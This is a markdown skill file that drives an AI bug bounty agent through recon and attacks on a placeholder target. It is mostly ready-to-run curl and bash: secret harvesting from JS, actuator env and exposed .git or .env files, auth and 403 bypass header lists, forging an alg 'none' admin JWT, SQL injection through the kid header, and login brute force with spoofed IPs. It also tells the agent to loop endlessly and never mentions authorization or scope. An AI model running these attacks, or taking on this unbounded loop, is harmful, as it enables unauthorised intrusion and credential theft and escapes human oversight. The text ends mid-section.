# HIDDEN.md — Bug Bounty Intelligence Skill
## Deep Endpoint Discovery, Tech Stack Analysis & Knowledge Accumulation System

> **PURPOSE**: This skill drives an AI bug bounty assistant to discover hidden endpoints, understand target tech stacks deeply, read JS files intelligently, accumulate knowledge, and find ONLY valid, high-impact findings — zero false positives, zero theoretical noise.

---

## ═══════════════════════════════════════
## PHASE 0 — OPERATING PRINCIPLES (READ FIRST)
## ═══════════════════════════════════════

```
RULE 1:  NEVER report a finding without a valid HTTP proof (status code + response body evidence)
RULE 2:  NEVER guess — fingerprint first, then act on what you KNOW
RULE 3:  NEVER stop after finding one endpoint — chain everything
RULE 4:  ALWAYS build KNOWLEDGE.md as you discover — every new fact gets logged
RULE 5:  FALSE POSITIVE = FAILURE. One valid P1 > 100 theoretical findings
RULE 6:  IMPACT FIRST — if you can't explain the damage, move on
RULE 7:  EVERY JS file found → READ IT FULLY before moving on
RULE 8:  EVERY response header → fingerprint it
RULE 9:  EVERY error page → extract tech info
RULE 10: CHAIN everything — one endpoint leads to another, always
```

---

## ═══════════════════════════════════════
## PHASE 1 — INITIAL TECH STACK FINGERPRINTING
## ═══════════════════════════════════════

### 1.1 — HTTP Header Intelligence (curl commands)

```bash
# Full header dump — first recon step, ALWAYS
curl -sivk "https://TARGET" 2>&1 | head -100

# Only response headers
curl -sIk "https://TARGET"

# Follow redirects and show all hops
curl -sILk "https://TARGET"

# Verbose with timing breakdown
curl -sw "\nTime: %{time_total}s\nStatus: %{http_code}\n" -o /dev/null -k "https://TARGET"

# OPTIONS request — reveals allowed methods
curl -siXOPTIONS "https://TARGET/api/" -k

# HEAD on common paths
curl -sIk "https://TARGET/api/v1/"
curl -sIk "https://TARGET/graphql"
curl -sIk "https://TARGET/admin"
curl -sIk "https://TARGET/.env"
```

### 1.2 — Header → Framework Mapping Table

| Header Key | Header Value Pattern | Tech Identified |
|---|---|---|
| `Server` | `nginx/1.x` | Nginx — check for path traversal, alias issues |
| `Server` | `Apache/2.x` | Apache — check `.htaccess`, `mod_status` |
| `Server` | `Microsoft-IIS/10` | IIS — check `web.config`, `trace.axd` |
| `X-Powered-By` | `PHP/7.x` | PHP — check phpinfo, `php.ini` |
| `X-Powered-By` | `Express` | Node/Express — check `/__proto__`, `/api/` |
| `X-Powered-By` | `ASP.NET` | .NET — check `/elmah.axd`, `ScriptResource.axd` |
| `X-Generator` | `Drupal 8` | Drupal — check `/user/login`, `/admin/` |
| `Set-Cookie` | `PHPSESSID` | PHP backend |
| `Set-Cookie` | `JSESSIONID` | Java (Spring/Tomcat) |
| `Set-Cookie` | `laravel_session` | Laravel PHP |
| `Set-Cookie` | `_rails` | Ruby on Rails |
| `Set-Cookie` | `csrftoken` | Django Python |
| `Set-Cookie` | `connect.sid` | Express.js (Node) |
| `X-AspNet-Version` | any | ASP.NET version leak |
| `X-Runtime` | `Ruby` | Rails backend |
| `Via` | any | Proxy/CDN layer |
| `CF-RAY` | any | Cloudflare |
| `X-Cache` | any | Varnish/CDN caching |
| `X-Amzn-Trace-Id` | any | AWS infrastructure |
| `X-Kong-Upstream-Latency` | any | Kong API Gateway |

### 1.3 — Error Page Tech Extraction

```bash
# Trigger 404 — extract framework from error page
curl -sk "https://TARGET/thispagedoesnotexist12345abc" | grep -iE "(framework|powered|version|stack|php|node|rails|django|laravel|spring|express)"

# Trigger 500 — extract stack trace
curl -sk -X POST "https://TARGET/api/endpoint" -H "Content-Type: application/json" -d '{"a":' | head -200

# Trigger 400 — parser error reveals backend
curl -sk "https://TARGET/api/" -H "Content-Type: application/json" -d 'INVALID_JSON{{{' | head -100

# Method not allowed — reveals routing framework
curl -siX DELETE "https://TARGET/" | grep -i "allow:"
```

### 1.4 — Cookie Name Fingerprinting Script

```bash
TARGET="https://TARGET"

COOKIES=$(curl -sc /tmp/cookies.txt "$TARGET" -o /dev/null -sk && cat /tmp/cookies.txt)

echo "[COOKIES FOUND]"
echo "$COOKIES"

echo ""
echo "[FRAMEWORK DETECTION FROM COOKIES]"
echo "$COOKIES" | grep -iE "PHPSESSID|laravel|JSESSIONID|_session|csrftoken|_rails|connect.sid|wordpress_|wp-|Drupal|CFID|CFTOKEN"
```

---

## ═══════════════════════════════════════
## PHASE 2 — JS FILE DISCOVERY & DEEP ANALYSIS
## ═══════════════════════════════════════

### 2.1 — JS File Discovery Methods

```bash
TARGET="https://TARGET"

# METHOD 1: Extract all JS from main page source
curl -sk "$TARGET" | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//'

# METHOD 2: Extract from all script tags (cleaner)
curl -sk "$TARGET" | grep -oP '(?<=src=")[^"]+\.js[^"]*'

# METHOD 3: Find JS via sitemap
curl -sk "$TARGET/sitemap.xml" | grep -oE 'https?://[^<]*\.js'

# METHOD 4: Spider for JS files using wayback machine
curl -sk "https://web.archive.org/cdx/search/cdx?url=TARGET/*&output=text&fl=original&collapse=urlkey&matchType=domain" | grep "\.js$" | sort -u

# METHOD 5: Find JS bundles (webpack, parcel, rollup)
curl -sk "$TARGET" | grep -oE '(chunk|bundle|main|app|vendor|runtime)[^"]*\.js'

# METHOD 6: Common JS locations
for path in /js/app.js /static/js/main.js /assets/js/app.js /dist/bundle.js /build/static/js/main.js; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[FOUND] $TARGET$path"
done
```

### 2.2 — JS File Analysis — Extract Endpoints

```bash
JSFILE="https://TARGET/static/js/main.js"

# Download the JS
curl -sk "$JSFILE" -o /tmp/target_main.js

# Extract API endpoints — pattern 1: string literals
grep -oE '"(/api/[^"]+)"' /tmp/target_main.js | sort -u

# Extract API endpoints — pattern 2: template literals
grep -oE '`(/api/[^`]+)`' /tmp/target_main.js | sort -u

# Extract API endpoints — pattern 3: fetch/axios calls
grep -oE '(fetch|axios\.(get|post|put|delete|patch))\s*\([`"'"'"'][^`"'"'"']+' /tmp/target_main.js | sort -u

# Extract API endpoints — pattern 4: URL construction
grep -oE '"/[a-zA-Z0-9/_-]+(/[a-zA-Z0-9/_-]+)+"' /tmp/target_main.js | grep -v '\.(png|jpg|svg|css|woff)' | sort -u

# Extract potential secrets
echo "[API KEYS / TOKENS]"
grep -oE '(api_key|apikey|api-key|token|secret|password|passwd|Authorization)["\s]*[:=]["\s]*[A-Za-z0-9+/=_-]{20,}' /tmp/target_main.js

# Extract S3 buckets
grep -oE '[a-z0-9.-]+\.s3\.amazonaws\.com' /tmp/target_main.js | sort -u

# Extract hardcoded IPs
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /tmp/target_main.js | sort -u

# Extract internal domains
grep -oE '[a-zA-Z0-9.-]+\.(internal|local|dev|staging|corp|private)\.' /tmp/target_main.js | sort -u

# Extract GraphQL operations
grep -oE '(query|mutation|subscription)\s+[A-Za-z]+' /tmp/target_main.js | sort -u
```

### 2.3 — JS Source Map Exploitation

```bash
TARGET="https://TARGET"
JSFILE="/static/js/main.abc123.js"

# Check if source map exists
curl -sk -o /dev/null -w "%{http_code}" "$TARGET$JSFILE.map"

# Download source map
curl -sk "$TARGET$JSFILE.map" -o /tmp/sourcemap.json

# Extract original source files from map
cat /tmp/sourcemap.json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for src in data.get('sources',[]):
    print(src)
"

# Reconstruct original source from map (reveals full unminified code)
# Install source-map-cli: npm install -g source-map-cli
# source-map-cli extract /tmp/sourcemap.json
```

### 2.4 — Webpack Chunk Enumeration

```bash
TARGET="https://TARGET"

# Find webpack chunk pattern from main JS
CHUNK_HASH=$(curl -sk "$TARGET" | grep -oE 'chunk\.[a-f0-9]+\.js' | head -1 | grep -oE '[a-f0-9]+')

# Enumerate chunk IDs (webpack bundles numbered 0-999 usually)
for i in $(seq 0 200); do
  URL="$TARGET/static/js/$i.chunk.js"
  STATUS=$(curl -sk -o /tmp/chunk.js -w "%{http_code}" "$URL")
  if [ "$STATUS" = "200" ]; then
    SIZE=$(wc -c < /tmp/chunk.js)
    echo "[CHUNK $i] $URL ($SIZE bytes)"
    # Extract endpoints from this chunk
    grep -oE '"(/api/[^"]+)"' /tmp/chunk.js | sort -u
  fi
done
```

---

## ═══════════════════════════════════════
## PHASE 3 — HIDDEN ENDPOINT DISCOVERY
## ═══════════════════════════════════════

### 3.1 — API Version Enumeration

```bash
TARGET="https://TARGET"

# Version patterns
for version in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v1.0 v2.0 v1.1 v2.1 beta alpha internal; do
  for base in /api /api/ /rest /rest/ /service /services /endpoint; do
    URL="$TARGET$base/$version/"
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$URL")
    [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "[$STATUS] $URL"
  done
done

# Check for older/deprecated API versions (often less protected)
for version in v0 v-1 legacy old deprecated v1-deprecated; do
  URL="$TARGET/api/$version/"
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$URL")
  [ "$STATUS" != "404" ] && echo "[DEPRECATED?][$STATUS] $URL"
done
```

### 3.2 — GraphQL Discovery & Introspection

```bash
TARGET="https://TARGET"

# Common GraphQL endpoints
for path in /graphql /graphiql /gql /query /api/graphql /v1/graphql /graphql/v1 /api/gql /graphql/console /altair /playground; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "[$STATUS] $TARGET$path"
done

# Test introspection (if enabled = massive info leak)
curl -sk -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool 2>/dev/null | head -50

# Get all queries and mutations
curl -sk -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name description } } } }"}' \
  | python3 -m json.tool 2>/dev/null

# Field suggestions (even without introspection — GraphQL leaks valid field names in errors)
curl -sk -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { INVALIDFIELD } }"}' 
# Look for "Did you mean" in response — reveals real field names

# Batch query attack
curl -sk -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ me { id } }"},{"query":"{ users { id email } }"}]'
```

### 3.3 — Swagger / OpenAPI Spec Discovery

```bash
TARGET="https://TARGET"

# Swagger/OpenAPI paths
SWAGGER_PATHS=(
  "/swagger.json"
  "/swagger.yaml"
  "/swagger/v1/swagger.json"
  "/swagger/v2/swagger.json"
  "/api-docs"
  "/api-docs.json"
  "/api/swagger.json"
  "/api/docs"
  "/v1/api-docs"
  "/v2/api-docs"
  "/v3/api-docs"
  "/openapi.json"
  "/openapi.yaml"
  "/openapi/v3/api-docs"
  "/api/swagger-ui.html"
  "/swagger-ui.html"
  "/swagger-ui/"
  "/redoc"
  "/docs"
  "/api/redoc"
)

for path in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  if [ "$STATUS" = "200" ]; then
    echo "[FOUND SPEC] $TARGET$path"
    # Extract all endpoints from spec
    curl -sk "$TARGET$path" | python3 -c "
import json,sys
try:
  data=json.load(sys.stdin)
  paths=data.get('paths',{})
  for p,methods in paths.items():
    for method in methods.keys():
      if method in ['get','post','put','delete','patch','options']:
        print(f'  [{method.upper()}] {p}')
except: pass
"
  fi
done
```

### 3.4 — Admin Panel Discovery

```bash
TARGET="https://TARGET"

ADMIN_PATHS=(
  "/admin" "/admin/" "/admin/login" "/admin/dashboard"
  "/administrator" "/administrator/"
  "/wp-admin" "/wp-admin/admin-ajax.php"
  "/panel" "/control" "/controlpanel" "/cp"
  "/management" "/manage" "/manager"
  "/backend" "/backoffice" "/back-office"
  "/cms" "/dashboard" "/console"
  "/superuser" "/superadmin" "/root"
  "/staff" "/internal" "/private"
  "/secure" "/restricted"
  "/_admin" "/_internal" "/_management"
  "/admin123" "/admins" "/adminpanel"
  "/sys" "/system" "/sysadmin"
  "/__admin" "/__internal"
  "/admin/api" "/api/admin"
  "/api/internal" "/api/private"
  "/metrics" "/health" "/status" "/ping"
  "/actuator" "/actuator/env" "/actuator/mappings"
  "/env" "/.env" "/__env"
  "/debug" "/debug/vars" "/debug/pprof"
  "/info" "/version" "/build"
)

for path in "${ADMIN_PATHS[@]}"; do
  STATUS=$(curl -sk -o /tmp/admin_resp.txt -w "%{http_code}" "$TARGET$path")
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && [ "$STATUS" != "400" ]; then
    SIZE=$(wc -c < /tmp/admin_resp.txt)
    echo "[$STATUS][$SIZE bytes] $TARGET$path"
  fi
done
```

### 3.5 — Spring Boot Actuator (Java) — High Impact

```bash
TARGET="https://TARGET"

ACTUATOR_PATHS=(
  "/actuator"
  "/actuator/env"           # EXPOSES ALL ENV VARS + SECRETS
  "/actuator/configprops"   # ALL CONFIG PROPERTIES
  "/actuator/mappings"      # ALL URL MAPPINGS → FULL ENDPOINT LIST
  "/actuator/beans"         # ALL SPRING BEANS
  "/actuator/health"
  "/actuator/info"
  "/actuator/metrics"
  "/actuator/loggers"
  "/actuator/threaddump"
  "/actuator/heapdump"      # FULL JVM HEAP DUMP — CREDS IN MEMORY
  "/actuator/httptrace"     # HTTP TRACES — USER TOKENS VISIBLE
  "/actuator/auditevents"
  "/actuator/scheduledtasks"
  "/actuator/conditions"
  "/actuator/flyway"
  "/actuator/liquibase"
  "/manage/actuator/env"
  "/management/actuator/env"
  "/:8080/actuator/env"
  "/:8443/actuator/env"
  "/:9090/actuator/env"
)

for path in "${ACTUATOR_PATHS[@]}"; do
  STATUS=$(curl -sk -o /tmp/act_resp.txt -w "%{http_code}" "$TARGET$path")
  if [ "$STATUS" = "200" ]; then
    SIZE=$(wc -c < /tmp/act_resp.txt)
    echo "[CRITICAL ACTUATOR EXPOSED][$SIZE bytes] $TARGET$path"
    # Extract sensitive values from env
    if [[ "$path" == *"env"* ]]; then
      cat /tmp/act_resp.txt | python3 -c "
import json,sys
try:
  data=json.load(sys.stdin)
  for src in data.get('propertySources',[]):
    props=src.get('properties',{})
    for k,v in props.items():
      if any(s in k.lower() for s in ['password','secret','key','token','credential','db','database','redis','aws','jwt']):
        print(f'  [SENSITIVE] {k}: {v}')
except Exception as e: print(e)
"
    fi
  fi
done
```

---

## ═══════════════════════════════════════
## PHASE 4 — SENSITIVE FILE DISCOVERY
## ═══════════════════════════════════════

### 4.1 — Git Exposure

```bash
TARGET="https://TARGET"

# Test for exposed git
curl -sk "$TARGET/.git/HEAD" | head -5
curl -sk "$TARGET/.git/config" | head -20
curl -sk "$TARGET/.git/COMMIT_EDITMSG" | head -10

# If .git/HEAD returns "ref: refs/heads/main" → GIT IS EXPOSED
# Full git dump using git-dumper
# pip install git-dumper
# git-dumper "$TARGET/.git" /tmp/git_dump/

# Manual git index parsing
curl -sk "$TARGET/.git/index" | strings | grep -E '\.(php|env|config|json|yaml|key|pem)' | head -20

# Recent commits
curl -sk "$TARGET/.git/logs/HEAD" | head -20

# List refs
curl -sk "$TARGET/.git/packed-refs"
```

### 4.2 — Environment & Config Files

```bash
TARGET="https://TARGET"

SENSITIVE_FILES=(
  "/.env"
  "/.env.local"
  "/.env.production"
  "/.env.development"
  "/.env.staging"
  "/.env.backup"
  "/.env.bak"
  "/.env.old"
  "/.env.example"   # sometimes has real values
  "/config.php"
  "/config.json"
  "/config.yaml"
  "/config.yml"
  "/settings.py"
  "/settings.json"
  "/application.properties"
  "/application.yaml"
  "/appsettings.json"
  "/web.config"
  "/database.yml"
  "/database.json"
  "/secrets.json"
  "/credentials.json"
  "/private.key"
  "/server.key"
  "/id_rsa"
  "/.ssh/id_rsa"
  "/wp-config.php"
  "/wp-config.php.bak"
  "/wp-config.bak"
  "/configuration.php"
  "/config/database.php"
  "/.htpasswd"
  "/.htaccess"
  "/robots.txt"       # Check disallowed paths
  "/sitemap.xml"      # Find hidden URLs
  "/crossdomain.xml"
  "/clientaccesspolicy.xml"
  "/.well-known/security.txt"
  "/.well-known/openid-configuration"  # OAuth config leak
  "/package.json"     # Shows all deps + version info
  "/composer.json"
  "/Gemfile"
  "/requirements.txt"
  "/Pipfile"
  "/yarn.lock"
  "/package-lock.json"
  "/Dockerfile"
  "/docker-compose.yml"
  "/docker-compose.yaml"
  "/.travis.yml"
  "/.circleci/config.yml"
  "/.github/workflows/"
  "/Makefile"
  "/README.md"
  "/CHANGELOG.md"
)

for file in "${SENSITIVE_FILES[@]}"; do
  STATUS=$(curl -sk -o /tmp/sens_resp.txt -w "%{http_code}" "$TARGET$file")
  if [ "$STATUS" = "200" ]; then
    SIZE=$(wc -c < /tmp/sens_resp.txt)
    echo "[EXPOSED][$SIZE bytes] $TARGET$file"
    head -5 /tmp/sens_resp.txt
    echo "---"
  fi
done
```

### 4.3 — Backup File Discovery (Target-Specific)

```bash
TARGET="https://TARGET"
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')
DOMAIN_SHORT=$(echo $DOMAIN | cut -d. -f1)

# Backup patterns based on target domain name
BACKUP_PATHS=(
  "/$DOMAIN_SHORT.zip"
  "/$DOMAIN_SHORT.tar.gz"
  "/$DOMAIN_SHORT.sql"
  "/$DOMAIN_SHORT.sql.gz"
  "/backup.zip"
  "/backup.tar.gz"
  "/backup.sql"
  "/db_backup.sql"
  "/database_backup.sql"
  "/site.zip"
  "/site.tar.gz"
  "/www.zip"
  "/htdocs.zip"
  "/public_html.zip"
  "/old.zip"
  "/old/"
  "/old_site/"
  "/backup/"
  "/backups/"
  "/bak/"
  "/tmp/"
  "/temp/"
  "/test/"
  "/dev/"
  "/logs/"
  "/log/"
  "/error.log"
  "/access.log"
  "/debug.log"
  "/php_errors.log"
)

for path in "${BACKUP_PATHS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "301" ] || [ "$STATUS" = "302" ]; then
    echo "[$STATUS] $TARGET$path"
  fi
done
```

---

## ═══════════════════════════════════════
## PHASE 5 — ADVANCED BYPASS TECHNIQUES
## ═══════════════════════════════════════

### 5.1 — Authentication Bypass Patterns

```bash
TARGET="https://TARGET"
ENDPOINT="/api/admin/users"

# Bypass 1: Add internal IP headers
curl -sk "$TARGET$ENDPOINT" -H "X-Forwarded-For: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "X-Real-IP: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "X-Originating-IP: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "X-Remote-IP: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "X-Client-IP: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "X-Host: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "X-Custom-IP-Authorization: 127.0.0.1"
curl -sk "$TARGET$ENDPOINT" -H "True-Client-IP: 127.0.0.1"

# Bypass 2: X-Original-URL / X-Rewrite-URL (IIS/Nginx path override)
curl -sk "$TARGET/" -H "X-Original-URL: /admin"
curl -sk "$TARGET/" -H "X-Rewrite-URL: /admin"
curl -sk "$TARGET/" -H "X-Forwarded-Host: TARGET" -H "X-Original-URL: /admin/users"

# Bypass 3: Path confusion / encoding tricks
curl -sk "$TARGET/admin%2F"
curl -sk "$TARGET/%2Fadmin"
curl -sk "$TARGET/./admin"
curl -sk "$TARGET//admin"
curl -sk "$TARGET/admin/.."
curl -sk "$TARGET/ADMIN"  # case sensitivity
curl -sk "$TARGET/Admin"
curl -sk "$TARGET/admin;"
curl -sk "$TARGET/admin#"
curl -sk "$TARGET/admin?"
curl -sk "$TARGET/admin../"
curl -sk "$TARGET/..;/admin"  # Spring Boot bypass

# Bypass 4: HTTP Method override
curl -sk -X GET "$TARGET$ENDPOINT" -H "X-HTTP-Method-Override: DELETE"
curl -sk -X POST "$TARGET$ENDPOINT" -H "X-HTTP-Method: PUT"
curl -sk -X POST "$TARGET$ENDPOINT" -H "_method=DELETE"

# Bypass 5: Content-Type tricks
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/x-www-form-urlencoded" -d "param=value"
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/json;charset=UTF-8" -d '{"a":"b"}'
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: text/xml" -d '<a>b</a>'
```

### 5.2 — 403 Forbidden Bypass Compendium

```bash
TARGET="https://TARGET"
BLOCKED_PATH="/admin"

# Method 1: HTTP verb tampering
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
  STATUS=$(curl -sk -X $method -o /dev/null -w "%{http_code}" "$TARGET$BLOCKED_PATH")
  echo "[$STATUS] $method $TARGET$BLOCKED_PATH"
done

# Method 2: Path tricks
PATHS=(
  "$BLOCKED_PATH/"
  "$BLOCKED_PATH/."
  "$BLOCKED_PATH/./"
  "$BLOCKED_PATH//"
  "$BLOCKED_PATH/%2e"
  "$BLOCKED_PATH/%2e/"
  "$BLOCKED_PATH/%20"
  "$BLOCKED_PATH%09"
  "$BLOCKED_PATH%0a"
  "/$BLOCKED_PATH"
  "${BLOCKED_PATH:0:1}%ef%bc%8f${BLOCKED_PATH:1}"
  "/./..${BLOCKED_PATH}"
  "/..;${BLOCKED_PATH}"
  "${BLOCKED_PATH//\//\/.}"
)

for path in "${PATHS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  [ "$STATUS" != "403" ] && [ "$STATUS" != "404" ] && echo "[$STATUS] $TARGET$path"
done

# Method 3: Header-based bypass
HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "Forwarded: for=127.0.0.1"
  "Client-IP: 127.0.0.1"
  "CF-Connecting-IP: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "Cluster-Client-IP: 127.0.0.1"
  "X-Forwarded-For: 0.0.0.0"
  "X-Forwarded-For: localhost"
  "X-Forwarded-For: 10.0.0.1"
  "X-Forwarded-For: 192.168.1.1"
)

for header in "${HEADERS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$BLOCKED_PATH" -H "$header")
  [ "$STATUS" != "403" ] && echo "[$STATUS] $TARGET$BLOCKED_PATH [Header: $header]"
done
```

### 5.3 — JWT Bypass Techniques

```bash
# If you have a JWT token:
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.signature"

# Decode JWT manually
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool; echo

# Test 1: Algorithm confusion — change HS256 to none
# Payload: {"sub":"admin","role":"admin"}
# New token with "alg":"none"
NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
ADMIN_PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
NONE_TOKEN="${NONE_HEADER}.${ADMIN_PAYLOAD}."

curl -sk "$TARGET/api/admin" -H "Authorization: Bearer $NONE_TOKEN"

# Test 2: Try empty signature
curl -sk "$TARGET/api/admin" -H "Authorization: Bearer ${TOKEN%.*}."

# Test 3: RS256 to HS256 algorithm confusion (if you have public key)
# Use public key as HMAC secret

# Test 4: kid header injection
# If kid is used in SQL: kid": "x' UNION SELECT 'hacked' --"
```

### 5.4 — Rate Limit Bypass

```bash
TARGET="https://TARGET"
ENDPOINT="/api/login"

# Bypass 1: IP rotation via headers
for i in $(seq 1 50); do
  FAKE_IP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
  curl -sk -X POST "$TARGET$ENDPOINT" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"Password'$i'!"}'
done

# Bypass 2: Case variation in email (if rate limited by email)
# admin@target.com → Admin@target.com, ADMIN@target.com, a.d.m.i.n@target.com

# Bypass 3: Null byte / space suffix
curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com ","password":"test"}'

# Bypass 4: Array of passwords (mass assignment bypass)
curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":["pass1","pass2","pass3","pass4","pass5"]}'
```

### 5.5 — IDOR Discovery Pattern

```bash
TARGET="https://TARGET"

# Step 1: Get your own resource ID
MY_RESPONSE=$(curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer YOUR_TOKEN")
MY_ID=$(echo $MY_RESPONSE | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('id',''))")
echo "Your ID: $MY_ID"

# Step 2: Enumerate around your ID
BASE_ID=$MY_ID
for offset in -10 -5 -3 -2 -1 1 2 3 5 10; do
  TEST_ID=$((BASE_ID + offset))
  STATUS=$(curl -sk -o /tmp/idor_resp.txt -w "%{http_code}" "$TARGET/api/user/$TEST_ID" -H "Authorization: Bearer YOUR_TOKEN")
  if [ "$STATUS" = "200" ]; then
    echo "[IDOR] Access to user $TEST_ID: $(cat /tmp/idor_resp.txt | head -1)"
  fi
done

# Step 3: Try predictable ID patterns
# UUID → try with hyphens removed, uppercase, etc.
# Numeric → try sequential
# Base64 → decode and modify

# Step 4: Test on ALL object types
ENDPOINTS=("/api/orders/" "/api/invoices/" "/api/documents/" "/api/reports/" "/api/tickets/" "/api/accounts/")
for endpoint in "${ENDPOINTS[@]}"; do
  for id in 1 2 3 100 1000 $(( MY_ID - 1 )) $(( MY_ID + 1 )); do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET${endpoint}${id}" -H "Authorization: Bearer YOUR_TOKEN")
    [ "$STATUS" = "200" ] && echo "[IDOR] $TARGET${endpoint}${id}"
  done
done
```

---

## ═══════════════════════════════════════
## PHASE 6 — KNOWLEDGE ACCUMULATION SYSTEM
## ═══════════════════════════════════════

### 6.1 — KNOWLEDGE.md Auto-Generation Template

When the AI begins reconnaissance, it MUST create and continuously update `KNOWLEDGE.md` with every discovered fact. The AI must NEVER stop adding to this file.

```markdown
# KNOWLEDGE.md — Target Intelligence File
# AUTO-GENERATED — DO NOT STOP ADDING TO THIS

## TARGET: [TARGET_DOMAIN]
## STARTED: [DATE/TIME]

---

## [K001] TECH STACK CONFIRMED
- Web Server: [from Server header]
- Backend: [from X-Powered-By / cookies / error pages]
- Frontend Framework: [from JS analysis]
- CDN/WAF: [from response headers]
- Database (inferred): [from error messages / framework]
- Cache Layer: [from X-Cache / Vary headers]

## [K002] ENDPOINTS DISCOVERED
### Confirmed Active (200)
- [METHOD] /path → [description]

### Interesting (non-404)
- [STATUS] /path → [why interesting]

### Requires Auth (401/403)
- [STATUS] /path → [bypass attempted? result?]

## [K003] JS FILES ANALYZED
- [URL] → [size] → [endpoints found] → [secrets found]

## [K004] SECRETS / SENSITIVE DATA
- [TYPE]: [VALUE/LOCATION] → [IMPACT]

## [K005] BYPASSES DISCOVERED
- [TECHNIQUE]: [which endpoint] → [result]

## [K006] PATTERNS IDENTIFIED
- ID format: [UUID/numeric/base64]
- API versioning: [v1/v2/date-based]
- Auth mechanism: [JWT/session/API key]
- Rate limiting: [present/absent/bypassable]

## [K007] ATTACK SURFACE MAP
[Draw the full attack surface based on everything found]

## [K008] NEXT STEPS (AI-Driven)
[What to try next based on knowledge accumulated]

## [K009] FAILED ATTEMPTS (DO NOT RETRY)
[Log failed paths to avoid repeating]

## [K010] CHAINING OPPORTUNITIES
[How discovered endpoints can be combined for higher impact]
```

### 6.2 — AI Self-Learning Loop

```
DISCOVERY LOOP (AI must run this continuously):

1. FIND → Discover new endpoint/file/parameter
2. PROBE → curl it with multiple methods, headers, payloads
3. ANALYZE → Read full response, extract all info
4. FINGERPRINT → What does this tell us about the target?
5. LOG → Add to KNOWLEDGE.md immediately
6. CHAIN → Does this enable access to another endpoint?
7. SEARCH → Search for new bypasses/techniques for this specific tech
8. APPLY → Apply new knowledge immediately
9. REPEAT → Go deeper, never stop
```

---

## ═══════════════════════════════════════
## PHASE 7 — TECHNOLOGY-SPECIFIC DEEP DIVES
## ═══════════════════════════════════════

### 7.1 — WordPress Deep Enumeration

```bash
TARGET="https://TARGET"

# User enumeration
curl -sk "$TARGET/?author=1" -L -I | grep Location
curl -sk "$TARGET/wp-json/wp/v2/users" | python3 -m json.tool

# Plugin/theme enumeration
curl -sk "$TARGET/wp-json/wp/v2/plugins" -H "Authorization: Bearer TOKEN"

# XML-RPC — often left enabled
curl -sk "$TARGET/xmlrpc.php" -d "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>"

# Common sensitive paths
for path in /wp-json/wp/v2/users /wp-json/ /wp-content/debug.log /wp-content/uploads/ /?author=1 /?author=2 /wp-login.php /wp-admin/; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "[$STATUS] $TARGET$path"
done
```

### 7.2 — Node.js / Express Deep Enumeration

```bash
TARGET="https://TARGET"

# Prototype pollution endpoints
curl -sk "$TARGET/api/user" -H "Content-Type: application/json" -d '{"__proto__":{"admin":true}}'
curl -sk "$TARGET/api/user" -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"admin":true}}}'

# Express route enumeration patterns
